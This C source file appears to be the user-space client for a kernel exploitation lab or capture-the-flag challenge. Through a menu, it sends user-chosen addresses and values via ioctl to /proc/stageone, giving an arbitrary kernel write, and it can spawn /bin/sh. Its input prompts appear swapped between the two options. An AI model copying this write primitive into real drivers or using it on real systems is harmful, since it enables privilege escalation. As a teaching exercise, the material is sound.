#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/ioctl.h>

void set_address(){
    unsigned long val;
    printf("give me input to write to target address: ");
    scanf("%lx", &val);
    printf("\nvalue is 0x%llx\n", val);
    int fd = open("/proc/stageone", O_RDWR);
    ioctl(fd, 0x1001, val);
    close(fd);
    puts("[+] Address Set");
} // set addr

void write_to_address(){
    unsigned long val;
    printf("give me input target address: ");
    scanf("%lx", &val);
    printf("\nvalue is 0x%llx\n", val);
    int fd = open("/proc/stageone", O_RDWR);
    ioctl(fd, 0x1002, val);
    close(fd);
    puts("[+] Wrote to Address");
} // write_addr

void call_bin_sh(){
    puts("[+] Calling Shell");
    system("sh");
} //shell 

void main_menu(){
    while(1){
        int menu = 0;
        printf("\nStage one\n\n1. set address\n2. write to address\n3. Spawn /bin/sh \n4. exit\nchoose:\n");
        scanf("%d", &menu);
        switch(menu){
            case 1:
                set_address();
                break;
            case 2:
                write_to_address();
                break;
            case 3:
                call_bin_sh();
                break;

            case 4:
                exit(0);
                break;
        } // case

    }// while

}


int main() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    main_menu();
    return 0;
}

